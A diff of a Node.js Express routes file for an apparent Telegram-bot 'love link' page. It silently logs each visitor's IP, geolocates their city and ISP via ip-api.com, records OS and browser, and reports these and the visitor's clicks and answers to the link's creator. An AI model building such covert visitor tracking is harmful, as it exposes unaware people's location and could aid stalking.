@@ -1,159 +1,160 @@
-const express = require('express');
 const path = require('path');
-const axios = require('axios');
-const UAParser = require('ua-parser-js');
+const https = require('https');
+const { Markup } = require('telegraf');
+const { parseUserAgent } = require('./visitor');
+const { CATEGORY_CONFIGS } = require('./category');
 
 function setupRoutes(app, db, saveDB, bot) {
-    app.use(express.static(path.join(__dirname, '../')));
-
-    app.get('/love/:id', (req, res) => {
-        res.sendFile(path.join(__dirname, '../index.html'));
-    });
-
     app.post('/api/get-content', async (req, res) => {
-        const { id } = req.body;
-        const linkData = db.linkDatabase[id];
-        
-        if (!linkData) {
-            return res.json({ success: false });
-        }
-
-        let isLocked = false;
-        if (linkData.countdown) {
-            const targetTime = new Date(linkData.countdown).getTime();
-            const now = new Date().getTime();
-            if (now < targetTime) {
-                isLocked = true;
-            }
-        }
-
-        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
-        const cleanIp = ip.split(',')[0].trim();
-        const ua = req.headers['user-agent'] || '';
-        const parser = new UAParser(ua);
-        const result = parser.getResult();
-
-        let country = 'Unknown';
-        let city = 'Unknown';
-        let isp = 'Unknown';
-
         try {
-            if (cleanIp !== '127.0.0.1' && cleanIp !== '::1') {
-                const geoRes = await axios.get(`http://ip-api.com/json/${cleanIp}`, { timeout: 2000 });
-                if (geoRes.data && geoRes.data.status === 'success') {
-                    country = geoRes.data.country || 'Unknown';
-                    city = geoRes.data.city || 'Unknown';
-                    isp = geoRes.data.isp || 'Unknown';
-                }
-            }
-        } catch (e) {}
-
-        const nowObj = new Date();
-        const timeStr = nowObj.toLocaleString('en-US', { timeZone: 'Asia/Dhaka' });
-
-        const visitorInfo = {
-            time: timeStr,
-            ip: cleanIp,
-            country: country,
-            city: city,
-            isp: isp,
-            os: `${result.os.name || 'Unknown'} ${result.os.version || ''}`.trim(),
-            browser: `${result.browser.name || 'Unknown'} ${result.browser.version || ''}`.trim()
-        };
-
-        if (!linkData.visitors) linkData.visitors = [];
-        linkData.visitors.push(visitorInfo);
-        await saveDB();
-
-        bot.telegram.sendMessage(
-            linkData.userId,
-            `🔗 আপনার তৈরি করা লিংকে একটি ভিজিট পড়েছে!\n\n🌐 IP: ${cleanIp}\n🌍 Country: ${country}\n📱 Device: ${visitorInfo.os}\n🌐 Browser: ${visitorInfo.browser}`
-        ).catch(() => {});
-
-        res.json({
-            success: true,
-            theme: linkData.type || 'classic',
-            music: linkData.music || '',
-            image: linkData.image || '',
-            animations: linkData.animations || [],
-            letter: linkData.letter || '',
-            buttonMovement: linkData.buttonMovement || false,
-            isLocked: isLocked,
-            countdownTime: linkData.countdown || null
-        });
-    });
-
-    app.post('/api/open-envelope', async (req, res) => {
-        const { id } = req.body;
-        const linkData = db.linkDatabase[id];
-        if (!linkData) return res.json({ success: false });
-
-        bot.telegram.sendMessage(
-            linkData.userId,
-            `✉️ আপনার লিংকের খাম খোলা হয়েছে!`
-        ).catch(() => {});
-
-        res.json({ success: true });
-    });
-
-    app.post('/api/movement-status', async (req, res) => {
-        const { id, status } = req.body;
-        const linkData = db.linkDatabase[id];
-        if (!linkData) return res.json({ success: false });
-
-        if (status === 'moving' && !linkData.movementNotifId) {
-            const sent = await bot.telegram.sendMessage(
-                linkData.userId,
-                `⚠️ ভিজিটর No বাটনে ক্লিক করার চেষ্টা করছে এবং বাটন মুভ করছে...`
-            ).catch(() => null);
-            if (sent) {
-                linkData.movementNotifId = sent.message_id;
+            const linkId = req.body.id;
+            const data = db.linkDatabase[linkId];
+            if (!data) return res.json({ success: false });
+            
+            const sentMsg = await bot.telegram.sendMessage(data.userId, "লিংকটি কেউ ওপেন করেছে").catch(() => null);
+            if (sentMsg) {
+                if (!data.openMessageIds) data.openMessageIds = {};
+                data.openMessageIds[req.ip || 'default'] = sentMsg.message_id;
                 await saveDB();
             }
+            
+            let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "";
+            let ip = rawIp.split(',')[0].trim();
+            if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
+            
+            const userAgent = req.headers['user-agent'] || "";
+            const { os, browser } = parseUserAgent(userAgent);
+            const currentTimeString = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });
+            
+            let visitorObj = {
+                time: currentTimeString, ip: ip, country: "Unknown", city: "Unknown", isp: "Unknown", os: os, browser: browser
+            };
+            
+            if (ip && ip !== "127.0.0.1" && ip !== "::1") {
+                https.get(`https://ip-api.com/json/${ip}`, (apiRes) => {
+                    let body = "";
+                    apiRes.on('data', chunk => body += chunk);
+                    apiRes.on('end', () => {
+                        try {
+                            const ipData = JSON.parse(body);
+                            if (ipData.status === "success") {
+                                visitorObj.country = ipData.country || "Unknown";
+                                visitorObj.city = ipData.city || "Unknown";
+                                visitorObj.isp = ipData.isp || "Unknown";
+                            }
+                        } catch (e) {}
+                        if (!data.visitors) data.visitors = [];
+                        data.visitors.push(visitorObj);
+                        saveDB();
+                    });
+                }).on('error', () => {
+                    if (!data.visitors) data.visitors = [];
+                    data.visitors.push(visitorObj);
+                    saveDB();
+                });
+            } else {
+                if (!data.visitors) data.visitors = [];
+                data.visitors.push(visitorObj);
+                await saveDB();
+            }
+            
+            if (data.countdown && new Date(data.countdown) > new Date()) {
+                return res.json({ success: true, isLocked: true, countdownTime: data.countdown });
+            }
+            
+            const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
+            return res.json({ 
+                success: true, isLocked: false, title: config.title, music: data.music, 
+                animations: data.animations, letter: data.letter, emojis: config.emojis, 
+                question: config.question, buttons: config.buttons, image: data.image || null,
+                buttonMovement: data.buttonMovement || false 
+            });
+        } catch (err) { 
+            res.json({ success: false }); 
         }
-        res.json({ success: true });
+    });
+
+    app.post('/api/notify-envelope-open', async (req, res) => {
+        try {
+            const { id } = req.body;
+            const data = db.linkDatabase[id];
+            if (!data) return res.json({ success: false });
+            
+            if (data.openMessageIds) {
+                const clientIp = req.ip || 'default';
+                const msgId = data.openMessageIds[clientIp] || Object.values(data.openMessageIds)[0];
+                if (msgId) {
+                    bot.telegram.deleteMessage(data.userId, msgId).catch(() => {});
+                    delete data.openMessageIds[clientIp];
+                }
+            }
+
+            const sentMsg = await bot.telegram.sendMessage(data.userId, "খাম খোলা হয়েছে").catch(() => null);
+            if (sentMsg) {
+                if (!data.openMessageIds) data.openMessageIds = {};
+                data.openMessageIds[req.ip || 'default'] = sentMsg.message_id;
+                await saveDB();
+            }
+
+            return res.json({ success: true });
+        } catch (err) {
+            res.json({ success: false });
+        }
+    });
+
+    app.post('/api/notify-movement-attempt', async (req, res) => {
+        try {
+            const { id } = req.body;
+            const data = db.linkDatabase[id];
+            if (!data) return res.json({ success: false });
+
+            bot.telegram.sendMessage(data.userId, "no এ ক্লিক করার চেষ্টা করা হচ্ছে").catch(() => {});
+            return res.json({ success: true });
+        } catch (err) {
+            res.json({ success: false });
+        }
     });
 
     app.post('/api/submit-answer', async (req, res) => {
-        const { id, answer, message, movementCount, isNoClicked } = req.body;
-        const linkData = db.linkDatabase[id];
-        if (!linkData) return res.json({ success: false });
-
-        linkData.answer = answer;
-        if (movementCount !== undefined) linkData.movementCount = movementCount;
-
-        if (linkData.movementNotifId) {
-            await bot.telegram.deleteMessage(linkData.userId, linkData.movementNotifId).catch(() => {});
-            linkData.movementNotifId = null;
-        }
-
-        let ansText = "";
-        if (movementCount && movementCount > 0) {
-            ansText = `🎯 ভিজিটর ${movementCount} বার No বাটন মুভমেন্ট করিয়েছে এবং চূড়ান্ত উত্তর দিয়েছে: ${answer}`;
-        } else {
-            ansText = `📩 ভিজিটরের চূড়ান্ত উত্তর: ${answer}`;
-        }
-
-        const sentAns = await bot.telegram.sendMessage(linkData.userId, ansText).catch(() => null);
-        if (sentAns) {
-            linkData.lastAnswerMsgId = sentAns.message_id;
-        }
-
-        if (message) {
-            linkData.visitorMessage = message;
-            if (linkData.lastAnswerMsgId) {
-                await bot.telegram.deleteMessage(linkData.userId, linkData.lastAnswerMsgId).catch(() => {});
-                linkData.lastAnswerMsgId = null;
+        try {
+            const { id, answer, message, movementCount } = req.body;
+            const data = db.linkDatabase[id];
+            if (!data) return res.json({ success: false });
+            
+            data.answer = answer;
+            if (message) {
+                data.visitorMessage = message;
             }
-            await bot.telegram.sendMessage(
-                linkData.userId,
-                `💬 ভিজিটর একটি মেসেজ পাঠিয়েছে:\n\n${message}`
-            ).catch(() => {});
-        }
+            if (movementCount !== undefined) {
+                data.movementCount = movementCount;
+            }
+            
+            if (data.openMessageIds) {
+                const clientIp = req.ip || 'default';
+                const msgId = data.openMessageIds[clientIp] || Object.values(data.openMessageIds)[0];
+                if (msgId) {
+                    bot.telegram.deleteMessage(data.userId, msgId).catch(() => {});
+                    delete data.openMessageIds[clientIp];
+                }
+            }
+            
+            await saveDB();
+            
+            const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
+            let notificationText = `আপনার তৈরি করা লিংক থেকে রিপ্লাই এসেছে。\nQuestion: ${config.question}\nAns: ${answer}`;
+            if (message) {
+                notificationText += `\n\nআপনার লিংক থেকে মেসেজ এসেছে。\nMsg: ${message}`;
+            }
 
-        await saveDB();
-        res.json({ success: true });
+            bot.telegram.sendMessage(data.userId, notificationText, Markup.inlineKeyboard([[Markup.button.callback("❌ Link Off", `delete_link_${id}`)]])).catch(() => {});
+            
+            return res.json({ success: true });
+        } catch (err) { 
+            res.json({ success: false }); 
+        }
     });
+
+    app.get('/love/:id', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
 }
 
 module.exports = { setupRoutes };
